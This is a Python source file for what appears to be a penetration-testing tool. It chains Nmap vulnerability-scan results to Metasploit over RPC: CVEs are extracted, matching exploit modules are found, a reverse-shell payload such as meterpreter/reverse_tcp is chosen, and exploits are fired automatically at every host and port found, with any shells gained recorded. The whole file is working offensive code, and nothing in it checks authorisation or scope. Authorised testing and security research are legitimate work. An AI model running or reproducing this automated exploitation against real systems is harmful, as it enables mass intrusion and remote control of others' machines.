"""
Enhanced Pentest Automation Tool
Integrates Nmap vulnerability analysis results with Metasploit exploitation
"""

import asyncio
import json
import os
import sys
import time
import logging
import socket
import netifaces
import re
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import queue
from pymetasploit3.msfrpc import MsfRpcClient
from contextlib import asynccontextmanager
from logging.handlers import RotatingFileHandler
import yaml

# Import Nmap analysis functionality
from nmap_vulners_analyze import parse_nmap_xml, Vulnerability

# Configuration and Constants
CONFIG_PATH = "config.yaml"
MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
MAX_LOG_FILES = 5

class ExploitStatus(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    TIMEOUT = "timeout"
    ERROR = "error"

@dataclass
class ExploitResult:
    target_ip: str
    target_port: int
    module_name: str
    cve: str
    status: ExploitStatus
    payload: str
    message: str
    timestamp: datetime
    session_id: Optional[str] = None
    
    def to_dict(self) -> dict:
        return {
            'timestamp': self.timestamp.isoformat(),
            'target_ip': self.target_ip,
            'target_port': self.target_port,
            'module': self.module_name,
            'cve': self.cve,
            'status': self.status.value,
            'payload': self.payload,
            'message': self.message,
            'session_id': self.session_id
        }

class PentestAutomation:
    def __init__(self, config_path: str):
        self.logger = self._setup_logger()
        self.config = self._load_config(config_path)
        self.client = self._initialize_msfrpc()
        self.results: List[ExploitResult] = []
        self.active_sessions: Dict[str, dict] = {}

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger('PentestAutomation')
        logger.setLevel(logging.INFO)
        
        # File handler with rotation
        os.makedirs('logs', exist_ok=True)
        file_handler = RotatingFileHandler(
            f'logs/pentest_{datetime.now().strftime("%Y%m%d")}.log',
            maxBytes=MAX_LOG_SIZE,
            backupCount=MAX_LOG_FILES
        )
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(file_handler)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        logger.addHandler(console_handler)
        
        return logger

    def _load_config(self, config_path: str) -> dict:
        try:
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
            required = ['msf_host', 'msf_port', 'msf_password', 'lhost', 'lport']
            if not all(k in config for k in required):
                raise ValueError(f"Missing required config keys: {required}")
            return config
        except Exception as e:
            self.logger.error(f"Config loading error: {str(e)}")
            raise

    def _initialize_msfrpc(self) -> MsfRpcClient:
        try:
            client = MsfRpcClient(
                self.config['msf_password'],
                server=self.config['msf_host'],
                port=self.config['msf_port']
            )
            self.logger.info("Successfully connected to Metasploit RPC")
            return client
        except Exception as e:
            self.logger.error(f"Metasploit RPC connection error: {str(e)}")
            raise

    async def find_suitable_payload(self, module_path: str, platform: str = 'windows') -> str:
        """Find suitable reverse shell payload for the given module"""
        try:
            payloads = self.client.modules.use('exploit', module_path).targeted_payloads()
            
            # Preferred payload patterns
            preferences = [
                f"{platform}/meterpreter/reverse_tcp",
                f"{platform}/shell/reverse_tcp",
                "generic/shell_reverse_tcp"
            ]
            
            # Try to find preferred payload
            for pref in preferences:
                for payload in payloads:
                    if pref in payload:
                        return payload
            
            # Return first available payload if no preferred found
            return payloads[0] if payloads else "generic/shell_reverse_tcp"
            
        except Exception as e:
            self.logger.error(f"Error finding payload: {str(e)}")
            return "generic/shell_reverse_tcp"

    async def search_exploit_module(self, cve: str) -> Optional[str]:
        """Search for Metasploit module matching CVE"""
        try:
            results = self.client.modules.search(cve)
            for result in results:
                if 'exploit' in result['type'] and cve.lower() in result.get('name', '').lower():
                    return result['fullname']
            return None
        except Exception as e:
            self.logger.error(f"Module search error: {str(e)}")
            return None

    async def execute_exploit(self, 
                            target_ip: str, 
                            target_port: int, 
                            module_path: str, 
                            payload: str,
                            cve: str) -> ExploitResult:
        """Execute exploit with specified module and payload"""
        start_time = datetime.now()
        
        try:
            # Set up exploit module
            exploit = self.client.modules.use('exploit', module_path)
            exploit['RHOSTS'] = target_ip
            exploit['RPORT'] = target_port
            exploit['LHOST'] = self.config['lhost']
            exploit['LPORT'] = self.config['lport']
            
            # Launch exploit
            self.logger.info(f"Launching {module_path} against {target_ip}:{target_port}")
            
            # Track sessions before exploit
            sessions_before = set(self.client.sessions.list.keys())
            
            # Execute exploit
            exploit.execute(payload=payload)
            
            # Wait and check for new session
            await asyncio.sleep(10)
            sessions_after = set(self.client.sessions.list.keys())
            new_sessions = sessions_after - sessions_before
            
            if new_sessions:
                session_id = list(new_sessions)[0]
                status = ExploitStatus.SUCCESS
                message = f"Successfully established session {session_id}"
                self.active_sessions[session_id] = {
                    'timestamp': start_time,
                    'target_ip': target_ip,
                    'module': module_path
                }
            else:
                status = ExploitStatus.FAILURE
                message = "Failed to establish session"
                session_id = None
            
            result = ExploitResult(
                target_ip=target_ip,
                target_port=target_port,
                module_name=module_path,
                cve=cve,
                status=status,
                payload=payload,
                message=message,
                timestamp=start_time,
                session_id=session_id
            )
            
            self.results.append(result)
            return result
            
        except Exception as e:
            self.logger.error(f"Exploit execution error: {str(e)}")
            return ExploitResult(
                target_ip=target_ip,
                target_port=target_port,
                module_name=module_path,
                cve=cve,
                status=ExploitStatus.ERROR,
                payload=payload,
                message=str(e),
                timestamp=start_time
            )

    async def process_nmap_results(self, nmap_xml_path: str) -> None:
        """Process Nmap results and execute exploits"""
        try:
            vulnerabilities = parse_nmap_xml(nmap_xml_path)
            
            for vuln in vulnerabilities:
                # Extract CVE
                cve_match = re.search(r'(CVE-\d{4}-\d+)', vuln.name)
                if not cve_match:
                    continue
                    
                cve = cve_match.group(1)
                
                # Find corresponding Metasploit module
                module_path = await self.search_exploit_module(cve)
                if not module_path:
                    self.logger.warning(f"No Metasploit module found for {cve}")
                    continue
                
                # Find suitable payload
                payload = await self.find_suitable_payload(module_path)
                
                # Execute exploit
                result = await self.execute_exploit(
                    target_ip=vuln.host,
                    target_port=int(vuln.port),
                    module_path=module_path,
                    payload=payload,
                    cve=cve
                )
                
                self.logger.info(f"Exploit result: {result.status.value} - {result.message}")
                
        except Exception as e:
            self.logger.error(f"Error processing Nmap results: {str(e)}")

    def save_results(self, output_file: str) -> None:
        """Save exploitation results to file"""
        try:
            results_data = {
                'timestamp': datetime.now().isoformat(),
                'total_exploits': len(self.results),
                'successful_exploits': len([r for r in self.results if r.status == ExploitStatus.SUCCESS]),
                'results': [result.to_dict() for result in self.results]
            }
            
            with open(output_file, 'w') as f:
                json.dump(results_data, f, indent=2)
                
            self.logger.info(f"Results saved to {output_file}")
            
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")

async def main():
    if len(sys.argv) != 3:
        print("Usage: python pene.py <config.yaml> <nmap_results.xml>")
        sys.exit(1)
    
    try:
        automation = PentestAutomation(sys.argv[1])
        await automation.process_nmap_results(sys.argv[2])
        automation.save_results("exploit_results.json")
        
    except Exception as e:
        logging.error(f"Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())